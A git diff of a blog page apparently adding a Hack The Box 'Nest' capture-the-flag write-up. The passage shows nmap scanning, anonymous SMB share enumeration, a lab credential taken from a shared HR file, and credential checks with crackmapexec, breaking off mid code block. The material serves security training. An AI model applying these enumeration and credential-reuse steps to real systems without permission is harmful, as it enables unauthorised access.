@@ -40,13 +40,13 @@
 <meta property="og:image" content="https://www.hackthebox.com/storage/avatars/0b1bebcefe0bf8cf8c31de8f8e5b76dc.png" />
 <meta property="og:image:alt" content="Machine Icon" />
 <meta property="og:type" content="article" />
-<meta property="article:published_time" content="2019-08-08T11:33:00+08:00" />
+<meta property="article:published_time" content="2024-09-03T00:00:00-07:00" />
 <meta name="twitter:card" content="summary_large_image" />
 <meta property="twitter:image" content="https://www.hackthebox.com/storage/avatars/0b1bebcefe0bf8cf8c31de8f8e5b76dc.png" />
 <meta name="twitter:image:alt" content="Machine Icon" />
 <meta property="twitter:title" content="HTB: Nest Writeup" />
 <script type="application/ld+json">
-{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2019-08-08T11:33:00+08:00","datePublished":"2019-08-08T11:33:00+08:00","description":"In this post we’re resolving Nest machine from HTB, this is cataloged as an easy Windows box where SMB guest access leads to low-privileged credentials. Dive into configuration files for sensitive info, uncover a password through source code analysis, and decrypt Administrator credentials by enumerating a custom service.","headline":"HTB: Nest Writeup","image":{"alt":"Machine Icon","url":"https://www.hackthebox.com/storage/avatars/0b1bebcefe0bf8cf8c31de8f8e5b76dc.png","@type":"imageObject"},"mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:5000/posts/Nest/"},"url":"http://localhost:5000/posts/Nest/"}</script>
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2024-09-03T00:00:00-07:00","datePublished":"2024-09-03T00:00:00-07:00","description":"In this post we’re resolving Nest machine from HTB, this is cataloged as an easy Windows box where SMB guest access leads to low-privileged credentials. Dive into configuration files for sensitive info, uncover a password through source code analysis, and decrypt Administrator credentials by enumerating a custom service.","headline":"HTB: Nest Writeup","image":{"alt":"Machine Icon","url":"https://www.hackthebox.com/storage/avatars/0b1bebcefe0bf8cf8c31de8f8e5b76dc.png","@type":"imageObject"},"mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:5000/posts/Nest/"},"url":"http://localhost:5000/posts/Nest/"}</script>
 <!-- End Jekyll SEO tag -->
 
 
@@ -472,6 +472,636 @@
     <!-- combine -->
     
   
+    
+
+    
+    
+
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+
+    <!-- take out classes -->
+    
+
+    
+    
+
+    
+
+    
+      
+    
+
+    <!-- lazy-load images -->
+    
+
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
+
+      
+        <!-- create the image wrapper -->
+        
+
+        
+        
+      
+    
+
+    <!-- combine -->
+    
+  
+    
+
+    
+    
+
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+
+    <!-- take out classes -->
+    
+
+    
+    
+
+    
+
+    
+      
+    
+
+    <!-- lazy-load images -->
+    
+
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
+
+      
+        <!-- create the image wrapper -->
+        
+
+        
+        
+      
+    
+
+    <!-- combine -->
+    
+  
+    
+
+    
+    
+
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+
+    <!-- take out classes -->
+    
+
+    
+    
+
+    
+
+    
+      
+    
+
+    <!-- lazy-load images -->
+    
+
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
+
+      
+        <!-- create the image wrapper -->
+        
+
+        
+        
+      
+    
+
+    <!-- combine -->
+    
+  
+    
+
+    
+    
+
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+
+    <!-- take out classes -->
+    
+
+    
+    
+
+    
+
+    
+      
+    
+
+    <!-- lazy-load images -->
+    
+
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
+
+      
+        <!-- create the image wrapper -->
+        
+
+        
+        
+      
+    
+
+    <!-- combine -->
+    
+  
+    
+
+    
+    
+
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+
+    <!-- take out classes -->
+    
+
+    
+    
+
+    
+
+    
+      
+    
+
+    <!-- lazy-load images -->
+    
+
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
+
+      
+        <!-- create the image wrapper -->
+        
+
+        
+        
+      
+    
+
+    <!-- combine -->
+    
+  
+    
+
+    
+    
+
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+
+    <!-- take out classes -->
+    
+
+    
+    
+
+    
+
+    
+      
+    
+
+    <!-- lazy-load images -->
+    
+
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
+
+      
+        <!-- create the image wrapper -->
+        
+
+        
+        
+      
+    
+
+    <!-- combine -->
+    
+  
+    
+
+    
+    
+
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+
+    <!-- take out classes -->
+    
+
+    
+    
+
+    
+
+    
+      
+    
+
+    <!-- lazy-load images -->
+    
+
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
+
+      
+        <!-- create the image wrapper -->
+        
+
+        
+        
+      
+    
+
+    <!-- combine -->
+    
+  
+    
+
+    
+    
+
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+
+    <!-- take out classes -->
+    
+
+    
+    
+
+    
+
+    
+      
+    
+
+    <!-- lazy-load images -->
+    
+
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
+
+      
+        <!-- create the image wrapper -->
+        
+
+        
+        
+      
+    
+
+    <!-- combine -->
+    
+  
+    
+
+    
+    
+
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+
+    <!-- take out classes -->
+    
+
+    
+    
+
+    
+
+    
+      
+    
+
+    <!-- lazy-load images -->
+    
+
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
+
+      
+        <!-- create the image wrapper -->
+        
+
+        
+        
+      
+    
+
+    <!-- combine -->
+    
+  
+    
+
+    
+    
+
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+
+    <!-- take out classes -->
+    
+
+    
+    
+
+    
+
+    
+      
+    
+
+    <!-- lazy-load images -->
+    
+
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
+
+      
+        <!-- create the image wrapper -->
+        
+
+        
+        
+      
+    
+
+    <!-- combine -->
+    
+  
 
   
 
@@ -519,6 +1149,28 @@
 
       
     
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
 
     
   
@@ -567,6 +1219,116 @@
 
       
     
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
 
     
   
@@ -574,6 +1336,126 @@
   
   
 
+  
+    
+    
+
+    
+      
+        
+        
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
+
+    
   
 
   
@@ -609,13 +1491,13 @@
 
 <time
   
-  data-ts="1565235180"
+  data-ts="1725346800"
   data-df="ll"
   
     data-bs-toggle="tooltip" data-bs-placement="bottom"
   
 >
-  Aug  8, 2019
+  Sep  3, 2024
 </time>
 
       </span>
@@ -657,9 +1539,9 @@
   class="readtime"
   data-bs-toggle="tooltip"
   data-bs-placement="bottom"
-  title="108 words"
+  title="5023 words"
 >
-  <em>1 min</em> read</span>
+  <em>27 min</em> read</span>
 
         </div>
       </div>
@@ -670,11 +1552,15 @@
 
 <h2 id="machine-information"><span class="me-2"><strong>Machine Information</strong></span><a href="#machine-information" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
 
-<h3 id="synopsis"><span class="me-2"><strong>Synopsis</strong></span><a href="#synopsis" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
+<blockquote>
+  <h3 id="synopsis"><span class="me-2"><strong>Synopsis</strong></span><a href="#synopsis" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
+</blockquote>
 
 <p>Nest is an easy difficulty Windows machine featuring an SMB server that permits guest access. The shares can be enumerated to gain credentials for a low privileged user. This user is found to have access to configuration files containing sensitive information. Another user’s password is found through source code analysis, which is used to gain a foothold on the box. A custom service is found to be running, which is enumerated to find and decrypt Administrator credentials.</p>
 
-<h3 id="general-information"><span class="me-2"><strong>General Information</strong></span><a href="#general-information" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
+<blockquote>
+  <h3 id="general-information"><span class="me-2"><strong>General Information</strong></span><a href="#general-information" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
+</blockquote>
 
 <div class="table-wrapper"><table>
   <thead>
@@ -709,7 +1595,1430 @@
 
 <h3 id="service-enumeration"><span class="me-2"><strong>Service Enumeration</strong></span><a href="#service-enumeration" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
 
-<p>First we’re gonna start doing a service scan using nmap</p>
+<p>First we’re gonna start doing a service scan using nmap, we’re also perfoming a service version detection and executing default nmap scripts.</p>
+
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+</pre></td><td class="rouge-code"><pre>❯ <span class="nb">sudo </span>nmap <span class="nt">-p-</span> <span class="nt">-sSVC</span> <span class="nt">--min-rate</span> 8000 <span class="nt">--min-parallelism</span> 100 <span class="nt">-n</span> <span class="nt">-oN</span> machine_services.txt 10.10.10.178
+Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-09-01 13:38 MST
+Nmap scan report <span class="k">for </span>10.10.10.178
+Host is up <span class="o">(</span>0.091s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 65533 filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>
+PORT     STATE SERVICE       VERSION
+445/tcp  open  microsoft-ds?
+4386/tcp open  unknown
+| fingerprint-strings:
+|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, X11Probe:
+|     Reporting Service V1.2
+|   FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, RTSPRequest, SIPOptions:
+|     Reporting Service V1.2
+|     Unrecognised <span class="nb">command</span>
+|   Help:
+|     Reporting Service V1.2
+|     This service allows <span class="nb">users </span>to run queries against databases using the legacy HQK format
+|     AVAILABLE COMMANDS <span class="nt">---</span>
+|     LIST
+|     SETDIR &lt;Directory_Name&gt;
+|     RUNQUERY &lt;Query_ID&gt;
+|     DEBUG &lt;Password&gt;
+|_    HELP &lt;Command&gt;
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port4386-TCP:V<span class="o">=</span>7.94SVN%I<span class="o">=</span>7%D<span class="o">=</span>9/1%Time<span class="o">=</span>66D4D0E5%P<span class="o">=</span>x86_64-pc-linux-gnu%r<span class="o">(</span>
+SF:NULL,21,<span class="s2">"</span><span class="se">\r\n</span><span class="s2">HQK</span><span class="se">\x</span><span class="s2">20Reporting</span><span class="se">\x</span><span class="s2">20Service</span><span class="se">\x</span><span class="s2">20V1</span><span class="se">\.</span><span class="s2">2</span><span class="se">\r\n\r\n</span><span class="s2">&gt;"</span><span class="o">)</span>%r<span class="o">(</span>GenericL
+SF:ines,3A,<span class="s2">"</span><span class="se">\r\n</span><span class="s2">HQK</span><span class="se">\x</span><span class="s2">20Reporting</span><span class="se">\x</span><span class="s2">20Service</span><span class="se">\x</span><span class="s2">20V1</span><span class="se">\.</span><span class="s2">2</span><span class="se">\r\n\r\n</span><span class="s2">&gt;</span><span class="se">\r\n</span><span class="s2">Unrecogni
+SF:sed</span><span class="se">\x</span><span class="s2">20command</span><span class="se">\r\n</span><span class="s2">&gt;"</span><span class="o">)</span>%r<span class="o">(</span>GetRequest,3A,<span class="s2">"</span><span class="se">\r\n</span><span class="s2">HQK</span><span class="se">\x</span><span class="s2">20Reporting</span><span class="se">\x</span><span class="s2">20Service</span><span class="se">\</span><span class="s2">
+SF:x20V1</span><span class="se">\.</span><span class="s2">2</span><span class="se">\r\n\r\n</span><span class="s2">&gt;</span><span class="se">\r\n</span><span class="s2">Unrecognised</span><span class="se">\x</span><span class="s2">20command</span><span class="se">\r\n</span><span class="s2">&gt;"</span><span class="o">)</span>%r<span class="o">(</span>HTTPOptions,3A,<span class="s2">"</span><span class="se">\</span><span class="s2">
+SF:r</span><span class="se">\n</span><span class="s2">HQK</span><span class="se">\x</span><span class="s2">20Reporting</span><span class="se">\x</span><span class="s2">20Service</span><span class="se">\x</span><span class="s2">20V1</span><span class="se">\.</span><span class="s2">2</span><span class="se">\r\n\r\n</span><span class="s2">&gt;</span><span class="se">\r\n</span><span class="s2">Unrecognised</span><span class="se">\x</span><span class="s2">20com
+SF:mand</span><span class="se">\r\n</span><span class="s2">&gt;"</span><span class="o">)</span>%r<span class="o">(</span>RTSPRequest,3A,<span class="s2">"</span><span class="se">\r\n</span><span class="s2">HQK</span><span class="se">\x</span><span class="s2">20Reporting</span><span class="se">\x</span><span class="s2">20Service</span><span class="se">\x</span><span class="s2">20V1</span><span class="se">\.</span><span class="s2">2</span><span class="se">\</span><span class="s2">
+SF:r</span><span class="se">\n\r\n</span><span class="s2">&gt;</span><span class="se">\r\n</span><span class="s2">Unrecognised</span><span class="se">\x</span><span class="s2">20command</span><span class="se">\r\n</span><span class="s2">&gt;"</span><span class="o">)</span>%r<span class="o">(</span>RPCCheck,21,<span class="s2">"</span><span class="se">\r\n</span><span class="s2">HQK</span><span class="se">\x</span><span class="s2">20Re
+SF:porting</span><span class="se">\x</span><span class="s2">20Service</span><span class="se">\x</span><span class="s2">20V1</span><span class="se">\.</span><span class="s2">2</span><span class="se">\r\n\r\n</span><span class="s2">&gt;"</span><span class="o">)</span>%r<span class="o">(</span>DNSVersionBindReqTCP,21,<span class="s2">"</span><span class="se">\r\n</span><span class="s2">H
+SF:QK</span><span class="se">\x</span><span class="s2">20Reporting</span><span class="se">\x</span><span class="s2">20Service</span><span class="se">\x</span><span class="s2">20V1</span><span class="se">\.</span><span class="s2">2</span><span class="se">\r\n\r\n</span><span class="s2">&gt;"</span><span class="o">)</span>%r
+
+Host script results:
+| smb2-security-mode:
+|   2:1:0:
+|_    Message signing enabled but not required
+| smb2-time:
+|   <span class="nb">date</span>: 2024-09-01T20:41:39
+|_  start_date: 2024-09-01T19:48:36
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>We discovered two open TCP ports on the machine: <strong>SMB</strong> on port 445 and a service called <strong>Reporting Service</strong> on port 4386.
+Nmap scripts devealed that the Reporting Service is running version 1.2, we must keep this in mind for future attack vectors.
+Since SMB is a well-known protocol, it’s easier to enumerating it, so let’s start by trying to get some null sessions or annonymous logins.</p>
+
+<h3 id="smb-anonymous-login"><span class="me-2">SMB Anonymous Login</span><a href="#smb-anonymous-login" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
+
+<p>I always use <strong>smbmap</strong> to perform this type of enumeration, since we can see what privileges we have on each share.
+There are many tools to perform SMB enumeration. we could also use other tools such as crackmapexec, some auxiliary msf module, etc.</p>
+
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+</pre></td><td class="rouge-code"><pre>❯ smbmap <span class="nt">-H</span> <span class="s2">"10.10.10.178"</span> <span class="nt">-u</span> <span class="s2">"guest"</span> <span class="nt">-p</span> <span class="s2">""</span>
+
+    ________  ___      ___  _______   ___      ___       __         _______
+   /<span class="s2">"       )|"</span>  <span class="se">\ </span>   /<span class="s2">"  ||   _  "</span><span class="se">\ </span>|<span class="s2">"  </span><span class="se">\ </span><span class="s2">   /"</span>  |     /<span class="s2">""</span><span class="se">\ </span>      |   __ <span class="s2">"</span><span class="se">\</span><span class="s2">
+  (:   </span><span class="se">\_</span><span class="s2">__/  </span><span class="se">\ </span><span class="s2">  </span><span class="se">\ </span><span class="s2"> //   |(. |_)  :) </span><span class="se">\ </span><span class="s2">  </span><span class="se">\ </span><span class="s2"> //   |    /    </span><span class="se">\ </span><span class="s2">     (. |__) :)
+   </span><span class="se">\_</span><span class="s2">__  </span><span class="se">\ </span><span class="s2">   /</span><span class="se">\ </span><span class="s2"> </span><span class="se">\/</span><span class="s2">.    ||:     </span><span class="se">\/</span><span class="s2">   /</span><span class="se">\ </span><span class="s2">  </span><span class="se">\/</span><span class="s2">.    |   /' /</span><span class="se">\ </span><span class="s2"> </span><span class="se">\ </span><span class="s2">    |:  ____/
+    __/  </span><span class="se">\ </span><span class="s2">  |: </span><span class="se">\.</span><span class="s2">        |(|  _  </span><span class="se">\ </span><span class="s2"> |: </span><span class="se">\.</span><span class="s2">        |  //  __'  </span><span class="se">\ </span><span class="s2">   (|  /
+   /"</span> <span class="se">\ </span>  :<span class="o">)</span> |.  <span class="se">\ </span>   /:  <span class="o">||</span>: |_<span class="o">)</span>  :<span class="o">)</span>|.  <span class="se">\ </span>   /:  | /   /  <span class="se">\ </span>  <span class="se">\ </span> /|__/ <span class="se">\</span>
+  <span class="o">(</span>_______/  |___|<span class="se">\_</span>_/|___|<span class="o">(</span>_______/ |___|<span class="se">\_</span>_/|___|<span class="o">(</span>___/    <span class="se">\_</span>__<span class="o">)(</span>_______<span class="o">)</span>
+<span class="nt">-----------------------------------------------------------------------------</span>
+SMBMap - Samba Share Enumerator v1.10.4 | Shawn Evans - ShawnDEvans@gmail.com&lt;mailto:ShawnDEvans@gmail.com&gt;
+                     https://github.com/ShawnDEvans/smbmap
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Detected 1 hosts serving SMB
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Established 1 SMB connections<span class="o">(</span>s<span class="o">)</span> and 1 authenticated session<span class="o">(</span>s<span class="o">)</span>
+
+<span class="o">[</span>+] IP: 10.10.10.178:445        Name: 10.10.10.178              Status: Authenticated
+        Disk                                                    Permissions     Comment
+        <span class="nt">----</span>                                                    <span class="nt">-----------</span>     <span class="nt">-------</span>
+        ADMIN<span class="nv">$ </span>                                                 NO ACCESS       Remote Admin
+        C<span class="nv">$ </span>                                                     NO ACCESS       Default share
+        Data                                                    READ ONLY
+        IPC<span class="nv">$ </span>                                                   NO ACCESS       Remote IPC
+        Secure<span class="nv">$ </span>                                                NO ACCESS
+        Users                                                   READ ONLY
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Closed 1 connections
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>We can see that there are non-standard shares. Additionally we have read access to <strong>Data</strong> and <strong>Users</strong>, so let’s explore…</p>
+
+<p>Now we proceed to download the content both shares</p>
+
+<blockquote>
+  <h4 id="data-share"><span class="me-2">Data Share</span><a href="#data-share" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>
+</blockquote>
+
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+</pre></td><td class="rouge-code"><pre>❯ <span class="nb">mkdir </span>SMB/Data <span class="nt">-p</span>
+❯ <span class="nb">cd </span>SMB/Data
+❯ smbclient <span class="se">\\\\</span>10.10.10.178<span class="se">\\</span>Data <span class="nt">-U</span> <span class="s2">"anonymous"</span> <span class="nt">-N</span>
+Try <span class="s2">"help"</span> to get a list of possible commands.
+smb: <span class="se">\&gt;</span> recurse on
+smb: <span class="se">\&gt;</span> prompt off
+smb: <span class="se">\&gt;</span> mget <span class="k">*</span>
+NT_STATUS_ACCESS_DENIED listing <span class="se">\I</span>T<span class="se">\*</span>
+NT_STATUS_ACCESS_DENIED listing <span class="se">\P</span>roduction<span class="se">\*</span>
+NT_STATUS_ACCESS_DENIED listing <span class="se">\R</span>eports<span class="se">\*</span>
+getting file <span class="se">\S</span>hared<span class="se">\M</span>aintenance<span class="se">\M</span>aintenance Alerts.txt of size 48 as Shared/Maintenance/Maintenance Alerts.txt <span class="o">(</span>0.1 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 0.1 KiloBytes/sec<span class="o">)</span>
+getting file <span class="se">\S</span>hared<span class="se">\T</span>emplates<span class="se">\H</span>R<span class="se">\W</span>elcome Email.txt of size 425 as Shared/Templates/HR/Welcome Email.txt <span class="o">(</span>1.2 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 0.7 KiloBytes/sec<span class="o">)</span>
+smb: <span class="se">\&gt;</span>
+</pre></td></tr></tbody></table></code></div></div>
+
+<blockquote>
+  <h4 id="users-share"><span class="me-2">Users Share</span><a href="#users-share" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>
+</blockquote>
+
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+</pre></td><td class="rouge-code"><pre>❯ smbclient <span class="se">\\\\</span>10.10.10.178<span class="se">\\</span>Users <span class="nt">-U</span> <span class="s2">"anonymous"</span> <span class="nt">-N</span>
+Try <span class="s2">"help"</span> to get a list of possible commands.
+smb: <span class="se">\&gt;</span> recurse on
+smb: <span class="se">\&gt;</span> prompt off
+smb: <span class="se">\&gt;</span> mget <span class="k">*</span>
+NT_STATUS_ACCESS_DENIED listing <span class="se">\A</span>dministrator<span class="se">\*</span>
+NT_STATUS_ACCESS_DENIED listing <span class="se">\C</span>.Smith<span class="se">\*</span>
+NT_STATUS_ACCESS_DENIED listing <span class="se">\L</span>.Frost<span class="se">\*</span>
+NT_STATUS_ACCESS_DENIED listing <span class="se">\R</span>.Thompson<span class="se">\*</span>
+NT_STATUS_ACCESS_DENIED listing <span class="se">\T</span>empUser<span class="se">\*</span>
+smb: <span class="se">\&gt;</span>
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>Unfortunately we couldn’t retrieve any files from the Users share, but no worries, we got two files from <strong>Data</strong>, so let’s take a look…</p>
+
+<h3 id="examining-shares-content"><span class="me-2">Examining Shares Content</span><a href="#examining-shares-content" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
+
+<p>Since the <strong>Data</strong> share contains four directories we can quickly find the files within these directories.</p>
+
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td><td class="rouge-code"><pre> find <span class="nb">.</span> <span class="nt">-type</span> f
+./Shared/Maintenance/Maintenance Alerts.txt
+./Shared/Templates/HR/Welcome Email.txt
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>If we look at the content of these files, we will find a welcome template and some instructions for accessing the user’s home folder.
+Aditionally we will find some credentials for the user <strong>TempUser</strong>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+</pre></td><td class="rouge-code"><pre>❯ <span class="nb">cat</span> <span class="s2">"./Shared/Maintenance/Maintenance Alerts.txt"</span>
+───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+       │ File: ./Shared/Maintenance/Maintenance Alerts.txt
+───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+   1   │ There is currently no scheduled maintenance work
+───────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+
+❯ <span class="nb">cat</span> <span class="s2">"./Shared/Templates/HR/Welcome Email.txt"</span>
+───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+       │ File: ./Shared/Templates/HR/Welcome Email.txt
+───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+   1   │ We would like to extend a warm welcome to our newest member of staff, &lt;FIRSTNAME&gt; &lt;SURNAME&gt;
+   2   │
+   3   │ You will find your home folder <span class="k">in </span>the following location:
+   4   │ <span class="se">\\</span>HTB-NEST<span class="se">\U</span>sers<span class="se">\&lt;</span>USERNAME&gt;
+   5   │
+   6   │ If you have any issues accessing specific services or workstations, please inform the
+   7   │ IT department and use the credentials below <span class="k">until </span>all systems have been <span class="nb">set </span>up <span class="k">for </span>you.
+   8   │
+   9   │ Username: TempUser
+  10   │ Password: welcome2019
+  11   │
+  12   │
+  13   │ Thank you
+  14   │ HR
+───────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>We can use CrackMapExec to comfirm if these credentials are valid.</p>
+
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td><td class="rouge-code"><pre>❯ crackmapexec smb 10.10.10.178 <span class="nt">-u</span> <span class="s2">"TempUser"</span> <span class="nt">-p</span> <span class="s2">"welcome2019"</span>
+SMB         10.10.10.178    445    HTB-NEST         <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 7 / Server 2008 R2 Build 7601 <span class="o">(</span>name:HTB-NEST<span class="o">)</span> <span class="o">(</span>domain:HTB-NEST<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+SMB         10.10.10.178    445    HTB-NEST         <span class="o">[</span>+] HTB-NEST<span class="se">\T</span>empUser:welcome2019
+</pre></td></tr></tbody></table></code></div></div>
+
+<h3 id="enumeration-using-credentials"><span class="me-2">Enumeration using credentials</span><a href="#enumeration-using-credentials" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
+
+<p>If we enumerate shares using the credentials we obtained, we will see that now we have access to a new share named <strong>Secure$</strong></p>
+
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
